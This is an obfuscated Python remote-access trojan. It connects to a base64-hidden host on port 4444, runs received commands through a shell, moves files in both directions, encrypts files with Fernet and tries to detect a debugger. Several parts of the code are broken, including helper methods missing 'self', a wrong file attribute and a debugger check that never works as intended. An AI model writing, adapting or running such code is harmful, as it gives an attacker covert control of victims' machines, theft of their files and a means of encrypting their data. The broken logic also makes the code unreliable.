
import subprocess as su
import sys
import os as o
import socket as s
import time as ti
import struct
from cryptography.fernet import Fernet as f
import base64 as bs

t = 3.0
et = 60.0


class X:

    def __init__(self, p, o) -> None:
        self.connection = s.s(s.AF_INET, s.SOCK_STREAM)
        self.connection.connect((p, o))

    def yes(m):
        return bs.b64encode(m.encode()).decode()
    
    def no(m):
        return bs.b64decode(m).decode()


    def ex(self, c):
        try:
            return su.check_output(c, shell=True)
        except su.CalledProcessError as err:
            return bytes(f"\nZXJyb3IgaW4gYywgdHJ5IGFnYWluOg==\n{self.yes(err)}\n", "utf-8")
        except Exception as err:
            return bytes(f"ZXJyb3I6IA=={self.yes(err)}", "utf-8")
    
 
    def r(self, n):
        try:
            self.connection.settimeout(et) 
            ti.sleep(5) 
            
            file_size = o.path.getsize(n)
            self.connection.sendall(struct.pack('!Q', file_size))  

            while True:
                is_ready = self.connection.recv(4096)
                if is_ready == b"cmVhZHk=":
                    break
            

            with open(n, "rb") as file:
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = file.read(4096)
                    if not chunk:
                        break
                    self.connection.sendall(chunk)
                    bytes_sent += len(chunk)

            self.connection.settimeout(t)
            return bytes("ZmlsZSBzZW50IGZyb20gc291cmNl", 'utf-8')
        except s.timeout:
            return bytes("c29ja2V0IHRpbWVkIG91dA==", 'utf-8')
        except Exception as err:
            return bytes(f"RXJyb3Igb2NjdXJyZWQgZHVyaW5nIHVwbG9hZDog{self.yes(err)}", 'utf-8')
      

    def c(self, path):
        try:
            o.chdir(path) 
            return bytes(f"Y2hhbmdlZCBkaXJlY3RvcnkgdG8g{self.yes(o.getcwd())}", "utf-8") 
        except FileNotFoundError:
            return bytes(f"RGlyZWN0b3J5IG5vdCBmb3VuZDog{self.yes(path)}", "utf-8")
        except Exception as err:
            return bytes(f"QW4gZXJyb3Igb2NjdXJyZWQ6IA=={self.yes(err)}", "utf-8")

    def rv(self):
        while True:
            try:
                c = self.connection.recv(2048).decode("utf-8")
                if len(c) == 0:
                    break
                return c, c.split(sep=" ")
            except (ConnectionResetError, BrokenPipeError):
                break
            except s.timeout:
                continue
            except Exception as err:
                print(err)
                break    
    

    def w(self, path):
        try:
            self.connection.settimeout(et)
            try:
                file_size_data = self.connection.recv(8)
                file_size = struct.unpack('!Q', file_size_data)[0]
            except Exception as err:
                print(err)
            self.connection.send(b"cmVhZHk=")

            n = o.path.basename(path)
            with open(n, "wb") as file:
                bytes_recieved = 0
                while bytes_recieved < file_size:
                    chunk = self.connection.recv(min(4096, file_size - bytes_recieved))
                    if not chunk:
                        break
                    file.write(chunk)
                    bytes_recieved += len(chunk)
            
            self.connection.settimeout(t)
            return bytes(f"RmlsZSBzYXZlZCBzdWNjZXNzZnVsbHkgYW5kIHdyaXR0ZW4gdG8g{self.yes(file.n)}", "utf-8")

        except Exception as err:
            return bytes(f"RXJyb3Igb2NjdXJyZWQ6IA=={self.yes(err)}", "utf-8")
    

    def e(self, path, key):
        try:
            self.connection.settimeout(et)
            cpher = f(key)

            with open(path, 'rb') as file:
                data = file.read()

            enc_data = cpher.encrypt(data)

            enc_file_path = f"{self.no("ZW5jXw==")}" + path
            with open(enc_file_path, 'wb') as encrypted_file:
                encrypted_file.write(enc_data)

            self.connection.settimeout(t)
            return bytes(f"{self.yes(enc_file_path)}IGVuY3J5cHRlZCBjb3JyZWN0bHk=", "utf-8")
        except Exception as err:
            print(err)
            return bytes(f"QW4gZXJyb3Igb2NjdXJyZWQ6IA=={self.yes(err)}", "utf-8")
    

    def d(self, path, key):
        try:
            self.connection.settimeout(et)
            cpher = f(key)

            with open(path, 'rb') as file:
                data = file.read()

            dec_data = cpher.decrypt(data)

            dec_file_path = f"{self.no("ZGVjXw==")}" + path
            with open(dec_file_path, 'wb') as decrypted_file:
                decrypted_file.write(dec_data)

            self.connection.settimeout(t)
            return bytes(f"{self.yes(dec_file_path)}IGRlY3J5cHRlZCBjb3JyZWN0bHk=", "utf-8")
        except Exception as err:
            print(err)
       

    def rrr(self):
            while True:
                try:
                    c, cp = self.rv()
                    if cp[0] == f"{self.no("ZXhpdA==")}":
                        self.connection.close()
                        exit()
                    elif cp[0] == f"{self.no("Y2Q=")}" and len(c) > 1:
                        filepath = cp[1:] 
                        fullpath = ' '.join(filepath) 
                        result = self.c(fullpath)
                    elif cp[0] == f"{self.no("ZG93bmxvYWQ=")}":
                        result = self.r(cp[1])
                    elif cp[0] == f"{self.no("dXBsb2Fk")}":
                        result = self.w(cp[1])
                    elif cp[0] == f"{self.no("ZW5j")}":
                        result = self.e(cp[1], cp[2])
                    elif cp[0] == f"{self.no("ZGVj")}":
                        result = self.d(cp[1], cp[2])
                    else:
                        result = self.ex(c)
                    self.connection.send(result)
                except s.timeout: 
                    continue

def dbg():
    return sys.gettrace is not None

while True:
    try:
        if dbg(): 
            exit
        else: 
            myX = X(bs.b64decode("MTY5LjI1NC4wLjE=").decode(), int(bs.b64decode("NDQ0NA==").decode()))
            myX.rrr()
    except:
        continue
